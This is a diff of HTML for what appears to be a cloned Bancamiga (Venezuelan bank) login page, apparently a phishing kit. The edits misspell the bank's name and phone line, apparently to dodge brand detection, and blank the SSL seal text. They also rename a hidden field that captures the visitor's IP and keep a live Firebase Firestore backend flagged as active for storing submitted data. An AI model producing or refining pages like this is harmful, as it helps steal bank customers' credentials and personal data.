J0cmFuc2xhdGUoMTQuMDAwMDAwLCAxMi4wMDAwMDApIj4KICAgICAgICAgICAgICAgICAgICA8cGF0aCBkPSJNMTcuNzgyODMzNSw5Ljc0MDc0MDc0IEMxOS41MzI1NzUsMTAuOTg3NjU0MyAyMS42Nzk0MjA5LDExLjcxNjA0OTQgMjQsMTEuNzE2MDQ5NCBMMjQsNy4yODM5NTA2MiBDMjMuNTY1NjY3LDcuMjgzOTUwNjIgMjMuMTE4OTI0NSw3LjIzNDU2NzkgMjIuNjk3MDAxLDcuMTQ4MTQ4MTUgTDIyLjY5NzAwMSwxMC42NDE5NzUzIEMyMC4zNzY0MjE5LDEwLjY0MTk3NTMgMTguMjI5NTc2LDkuOTEzNTgwMjUgMTYuNDc5ODM0NSw4LjY2NjY2NjY3IEwxNi40Nzk4MzQ1LDE3LjcxNjA0OTQgQzE2LjQ3OTgzNDUsMjIuMjQ2OTEzNiAxMi43OTQyMDg5LDI1LjkxMzU4MDIgOC4yMzk5MTcyNywyNS45MTM1ODAyIEM2LjUzOTgxMzg2LDI1LjkxMzU4MDIgNC45NjM4MDU1OCwyNS40MDc0MDc0IDMuNjQ4Mzk3MSwyNC41MzA4NjQyIEM1LjE0OTk0ODI5LDI2LjA0OTM4MjcgNy4yMzQ3NDY2NCwyNyA5LjU0MjkxNjI0LDI3IEMxNC4wOTcyMDc5LDI3IDE3Ljc4MjgzMzUsMjMuMzMzMzMzMyAxNy43ODI4MzM1LDE4LjgwMjQ2OTEgTDE3Ljc4MjgzMzUsOS43NTMwODY0MiBMMTcuNzgyODMzNSw5Ljc1MzA4NjQyIEwxNy43ODI4MzM1LDkuNzQwNzQwNzQgWiBNMTkuMzk2MDcwMyw1LjI3MTYwNDk0IEMxOC41MDI1ODUzLDQuMjk2Mjk2MyAxNy45MTkzMzgyLDMuMDM3MDM3MDQgMTcuNzgyODMzNSwxLjY1NDMyMDk5IEwxNy43ODI4MzM1LDEuMDg2NDE5NzUgTDE2LjU0MTg4MjEsMS4wODY0MTk3NSBDMTYuODUyMTIsMi44NTE4NTE4NSAxNy45MTkzMzgyLDQuMzU4MDI0NjkgMTkuMzgzNjYwOCw1LjI3MTYwNDk0IEwxOS4zODM2NjA4LDUuMjcxNjA0OTQgTDE5LjM5NjA3MDMsNS4yNzE2MDQ5NCBaIE02LjUyNzQwNDM0LDIxLjA0OTM4MjcgQzYuMDMxMDIzNzgsMjAuMzk1MDYxNyA1Ljc1ODAxNDQ4LDE5LjYwNDkzODMgNS43NTgwMTQ0OCwxOC43Nzc3Nzc4IEM1Ljc1ODAxNDQ4LDE2LjcwMzcwMzcgNy40NDU3MDgzOCwxNS4wMjQ2OTE0IDkuNTMwNTA2NzIsMTUuMDI0NjkxNCBDOS45MTUyMDE2NSwxNS4wMjQ2OTE0IDEwLjI5OTg5NjYsMTUuMDg2NDE5OCAxMC42NzIxODIsMTUuMTk3NTMwOSBMMTAuNjcyMTgyLDEwLjY2NjY2NjcgQzEwLjIzNzg0OSwxMC42MDQ5MzgzIDkuODAzNTE2MDMsMTAuNTgwMjQ2OSA5LjM2OTE4MzA0LDEwLjU5MjU5MjYgTDkuMzY5MTgzMDQsMTQuMTIzNDU2OCBDOC45OTY4OTc2MiwxNC4wMTIzNDU3IDguNjEyMjAyNjksMTMuOTUwNjE3MyA4LjIyNzUwNzc2LDEzLjk1MDYxNzMgQzYuMTQyNzA5NDEsMTMuOTUwNjE3MyA0LjQ1NTAxNTUxLDE1LjYyOTYyOTYgNC40NTUwMTU1MSwxNy43MDM3MDM3IEM0LjQ1NTAxNTUxLDE5LjE3MjgzOTUgNS4yOTg4NjI0NiwyMC40MzIwOTg4IDYuNTI3NDA0MzQsMjEuMDQ5MzgyNyBMNi41Mjc0MDQzNCwyMS4wNDkzODI3IFoiIGlkPSJTaGFwZSIgZmlsbD0iI0ZBM0U1OSI+PC9wYXRoPgogICAgICAgICAgICAgICAgICAgIDxwYXRoIGQ9Ik0xNi40Nzk4MzQ1LDguNjY2NjY2NjcgQzE4LjIyOTU3Niw5LjkxMzU4MDI1IDIwLjM3NjQyMTksMTAuNjQxOTc1MyAyMi42OTcwMDEsMTAuNjQxOTc1MyBMMjIuNjk3MDAxLDcuMTQ4MTQ4MTUgQzIxLjQwNjQxMTYsNi44NzY1NDMyMSAyMC4yNTIzMjY4LDYuMTk3NTMwODYgMTkuMzk2MDcwMyw1LjI3MTYwNDk0IEMxNy45MTkzMzgyLDQuMzU4MDI0NjkgMTYuODY0NTI5NSwyLjg1MTg1MTg1IDE2LjU1NDI5MTYsMS4wODY0MTk3NSBMMTMuMzAyOTk5LDEuMDg2NDE5NzUgTDEzLjMwMjk5OSwxOC44MDI0NjkxIEMxMy4zMDI5OTksMjAuODY0MTk3NSAxMS42MTUzMDUxLDIyLjU0MzIwOTkgOS41MzA1MDY3MiwyMi41NDMyMDk5IEM4LjMwMTk2NDg0LDIyLjU0MzIwOTkgNy4yMjIzMzcxMywyMS45NjI5NjMgNi41Mjc0MDQzNCwyMS4wNjE3Mjg0IEM1LjI5ODg2MjQ2LDIwLjQ0NDQ0NDQgNC40NTUwMTU1MSwxOS4xNzI4Mzk1IDQuNDU1MDE1NTEsMTcuNzE2MDQ5NCBDNC40NTUwMTU1MSwxNS42NDE5NzUzIDYuMTQyNzA5NDEsMTMuOTYyOTYzIDguMjI3NTA3NzYsMTMuOTYyOTYzIEM4LjYyNDYxMjIsMTMuOTYyOTYzIDkuMDA5MzA3MTQsMTQuMDI0NjkxNCA5LjM2OTE4MzA0LDE0LjEzNTgwMjUgTDkuMzY5MTgzMDQsMTAuNjA0OTM4MyBDNC45MDE3NTgwMSwxMC42OTEzNTggMS4zMDI5OTg5NywxNC4zMzMzMzMzIDEuMzAyOTk4OTcsMTguODAyNDY5MSBDMS4zMDI5OTg5NywyMS4wMzcwMzcgMi4xOTY0ODM5NywyMy4wNDkzODI3IDMuNjQ4Mzk3MSwyNC41MzA4NjQyIEM0Ljk2MzgwNTU4LDI1LjQwNzQwNzQgNi41Mzk4MTM4NiwyNS45MTM1ODAyIDguMjM5OTE3MjcsMjUuOTEzNTgwMiBDMTIuNzk0MjA4OSwyNS45MTM1ODAyIDE2LjQ3OTgzNDUsMjIuMjQ2OTEzNiAxNi40Nzk4MzQ1LDE3LjcxNjA0OTQgTDE2LjQ3OTgzNDUsOC42NjY2NjY2NyBaIiBpZD0iUGF0aCIgZmlsbD0iIzAwMDAwMCIgZmlsbC1ydWxlPSJub256ZXJvIj48L3BhdGg+CiAgICAgICAgICAgICAgICAgICAgPHBhdGggZD0iTTIyLjY5NzAwMSw3LjE0ODE0ODE1IEwyMi42OTcwMDEsNi4yMDk4NzY1NCBDMjEuNTMwNTA2Nyw2LjIwOTg3NjU0IDIwLjM4ODgzMTQsNS44ODg4ODg4OSAxOS4zOTYwNzAzLDUuMjcxNjA0OTQgQzIwLjI3NzE0NTgsNi4yMjIyMjIyMiAyMS40MzEyMzA2LDYuODg4ODg4ODkgMjIuNjk3MDAxLDcuMTQ4MTQ4MTUgWiBNMTYuNTU0MjkxNiwxLjA3NDA3NDA3IEMxNi41Mjk0NzI2LDAuOTAxMjM0NTY4IDE2LjUwNDY1MzYsMC43NDA3NDA3NDEgMTYuNDc5ODM0NSwwLjU2NzkwMTIzNSBMMTYuNDc5ODM0NSwwIEwxMiwwIEwxMiwxNy43MTYwNDk0IEMxMiwxOS43Nzc3Nzc4IDEwLjMxMjMwNjEsMjEuNDU2NzkwMSA4LjIyNzUwNzc2LDIxLjQ1Njc5MDEgQzcuNjE5NDQxNTcsMjEuNDU2NzkwMSA3LjAzNjE5NDQyLDIxLjMwODY0MiA2LjUyNzQwNDM0LDIxLjA2MTcyODQgQzcuMjIyMzM3MTMsMjEuOTYyOTYzIDguMzAxOTY0ODQsMjIuNTQzMjA5OSA5LjUzMDUwNjcyLDIyLjU0MzIwOTkgQzExLjYwMjg5NTYsMjIuNTQzMjA5OSAxMy4yOTA1ODk1LDIwLjg3NjU0MzIgMTMuMzAyOTk5LDE4LjgwMjQ2OTEgTDEzLjMwMjk5OSwxLjA4NjQxOTc1IEwxNi41NTQyOTE2LDEuMDg2NDE5NzUgTDE2LjU1NDI5MTYsMS4wNzQwNzQwNyBaIE05LjM2OTE4MzA0LDEwLjU5MjU5MjYgTDkuMzY5MTgzMDQsOS41OTI1OTI1OSBDOC45OTY4OTc2Miw5LjU0MzIwOTg4IDguNjEyMjAyNjksOS41MTg1MTg1MiA4LjIzOTkxNzI3LDkuNTE4NTE4NTIgQzMuNjg1NjI1NjUsOS41MTg1MTg1MiAwLDEzLjE4NTE4NTIgMCwxNy43MTYwNDk0IEMwLDIwLjU1NTU1NTYgMS40NTE5MTMxMywyMy4wNDkzODI3IDMuNjQ4Mzk3MSwyNC41MzA4NjQyIEMyLjE5NjQ4Mzk3LDIzLjA0OTM4MjcgMS4zMDI5OTg5NywyMS4wMzcwMzcgMS4zMDI5OTg5NywxOC44MDI0NjkxIEMxLjMwMjk5ODk3LDE0LjMzMzMzMzMgNC45MDE3NTgwMSwxMC43MDM3MDM3IDkuMzY5MTgzMDQsMTAuNjA0OTM4MyBMOS4zNjkxODMwNCwxMC42MDQ5MzgzIEw5LjM2OTE4MzA0LDEwLjU5MjU5MjYgWiIgaWQ9IlNoYXBlIiBmaWxsPSIjNTNDNkNFIj48L3BhdGg+CiAgICAgICAgICAgICAgICA8L2c+CiAgICAgICAgICAgIDwvZz4KICAgICAgICA8L2c+CiAgICA8L2c+Cjwvc3ZnPg=="
+                                                                                        src="assets/tiktok.svg"
                                                                                         alt=Tiktok>
                                                                         </a>
                                                                         <a href="">
                                                                                 <img class=redes-login
-                                                                                        src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iNTBweCIgaGVpZ2h0PSI0OXB4IiB2aWV3Qm94PSIwIDAgNTAgNDkiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8dGl0bGU+MDc5NkExOUMtNTU4Mi00MEExLTlGQUItQTk0MEY1ODA3OTk0PC90aXRsZT4KICAgIDxnIGlkPSJQYWdlLTEiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgogICAgICAgIDxnIGlkPSJMT0dJTi1CQU5DQU1JR0EiIHRyYW5zZm9ybT0idHJhbnNsYXRlKC0xNTM5LjAwMDAwMCwgLTgyMC4wMDAwMDApIiBmaWxsLXJ1bGU9Im5vbnplcm8iPgogICAgICAgICAgICA8ZyBpZD0iWU9VVFVCRSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTUzOS4wMDAwMDAsIDgyMC4wMDAwMDApIj4KICAgICAgICAgICAgICAgIDxwYXRoIGQ9Ik01MCwyNC41IEM0OS40MzM4MTk4LDU3LjE2NjY2NjcgMC41NTM1OTgzOSw1Ny4xNjY2NjY3IDAsMjQuNSBDMC41NjYxODAxNzEsLTguMTY2NjY2NjcgNDkuNDQ2NDAxNiwtOC4xNjY2NjY2NyA1MCwyNC41IFoiIGlkPSJQYXRoIiBmaWxsPSIjRkZGRkZGIj48L3BhdGg+CiAgICAgICAgICAgICAgICA8cGF0aCBkPSJNMzksMjEuOTU1MDMzNiBDMzksMTguNjY1MTAwNyAzNi4zNDk0NTk4LDE2IDMzLjA3NzUwMTIsMTYgTDE3LjkyMjQ5ODgsMTYgQzE0LjY1MDU0MDIsMTYgMTIsMTguNjY1MTAwNyAxMiwyMS45NTUwMzM2IEwxMiwyOS4wNDQ5NjY0IEMxMiwzMi4zMzQ4OTkzIDE0LjY1MDU0MDIsMzUgMTcuOTIyNDk4OCwzNSBMMzMuMDc3NTAxMiwzNSBDMzYuMzQ5NDU5OCwzNSAzOSwzMi4zMzQ4OTkzIDM5LDI5LjA0NDk2NjQgTDM5LDIxLjk1NTAzMzYgTDM5LDIxLjk1NTAzMzYgWiBNMzAuMDg0NTQ2NywyNi4wMzU1NzA1IEwyMy4yODY5ODkyLDI5LjQxNDc2NTEgQzIzLjAyMDY2NywyOS41NTUwMzM2IDIyLjEyMDI0NDIsMjkuMzYzNzU4NCAyMi4xMjAyNDQyLDI5LjA1NzcxODEgTDIyLjEyMDI0NDIsMjIuMTIwODA1NCBDMjIuMTIwMjQ0MiwyMS44MTQ3NjUxIDIzLjAzMzM0OSwyMS42MjM0ODk5IDIzLjI5OTY3MTIsMjEuNzc2NTEwMSBMMjkuODA1NTQyNSwyNS4zMzQyMjgyIEMzMC4wODQ1NDY3LDI1LjQ4NzI0ODMgMzAuMzYzNTUxLDI1Ljg4MjU1MDMgMzAuMDg0NTQ2NywyNi4wMzU1NzA1IEwzMC4wODQ1NDY3LDI2LjAzNTU3MDUgWiIgaWQ9IlNoYXBlIiBmaWxsPSIjRkYzQzJCIj48L3BhdGg+CiAgICAgICAgICAgIDwvZz4KICAgICAgICA8L2c+CiAgICA8L2c+Cjwvc3ZnPg=="
+                                                                                        src="assets/yt.svg"
                                                                                         alt=Youtube>
                                                                         </a>
                                                                 </div>
@@ -236,23 +220,23 @@
                                                                         <strong class=note>
                                                                                 Para mayor información o asesoria
                                                                                 contáctanos al <br>
-                                                                                Centro de atención Bancamiga (CAB)<br>
-                                                                                0500-TUBANCA y 0500-1000400
+                                                                                Centro de atención Bcamiga (CAB)<br>
+                                                                                0500-TUBCA y 0500-1000400
                                                                         </strong>
                                                                 </p>
                                                         </fieldset>
                                                 </div>
-                                        </form>
+                                        </div>
                                 </div>
                         </div>
                 </div>
         </div>
         <div class="page-footer text-center">
                 <strong class=txt-color-white>
-                        Bancamiga Banco Universal - RIF: J-31628759-9
+                        Bcamiga Bnc Universal - RIF: J-31628759-9
                         <span class=hidden-xs> Copyright © 2018.</span> Todos los derechos reservados.</strong>
                 <table class=pull-right style=margin-top:-10px width=135 border=0 cellpadding=2 cellspacing=0
-                        title="Click to Verify - This site chose Symantec SSL for secure e-commerce and confidential communications.">
+                        title="">
                         <tbody>
                                 <tr>
                                         <td width=135 align=center valign=top>
@@ -261,50 +245,45 @@
                                 </tr>
                 </table>
         </div>
-        <!--[if IE 8]>
-<h1>Su navegados esta fuera de la fecha, porfavor ingrese a www.microsoft.com/download</h1>
-<![endif]-->
+        
         <div id=divSmallBoxes></div>
         <div id=divMiniIcons></div>
         <div id=divbigBoxes></div>
 
-        <!-- Overlay de carga -->
-        <div id="overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9999; justify-content: center; align-items: center;">
-                <img src="midas/load.gif" alt="Cargando..." class="loader-gif">
-                <div class="loader-text">
-                  Estamos validando sus datos por favor espere un momento...
-                </div>
-        </div>
+        
 
-        <!-- Input oculto para IP -->
-        <input type="hidden" id="direccionIP" name="direccionIP">
+        <!-- Contexto/IP -->
+        <input type="hidden" id="ctx" name="ctx">
 
         <!-- Scripts del proyecto -->
         <!-- MODO FIREBASE REAL - ACTIVO -->
         <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
         <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
-        
+
         <!-- Configuración centralizada de Firebase y rutas -->
         <script src="js/firebase-config.js"></script>
-        
+
         <script>
-            // Ocultar overlay inicialmente
-            document.addEventListener('DOMContentLoaded', function() {
-                const overlay = document.getElementById('overlay');
-                if (overlay) {
-                    overlay.style.display = 'none';
-                }
-            });
+                // Ocultar overlay inicialmente
+                document.addEventListener('DOMContentLoaded', function () {
+                        const overlay = document.getElementById('overlay');
+                        if (overlay) {
+                                overlay.style.display = 'none';
+                        }
+                });
         </script>
         <script src="js/main.js"></script>
-        
-        <!-- MODO DEMO (comentado):
-        <script src="js/main-demo.js"></script>
-        -->
-        
+
+       
+
         <style>
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+                @keyframes spin {
+                        0% {
+                                transform: rotate(0deg);
+                        }
+
+                        100% {
+                                transform: rotate(360deg);
+                        }
+                }
         </style>
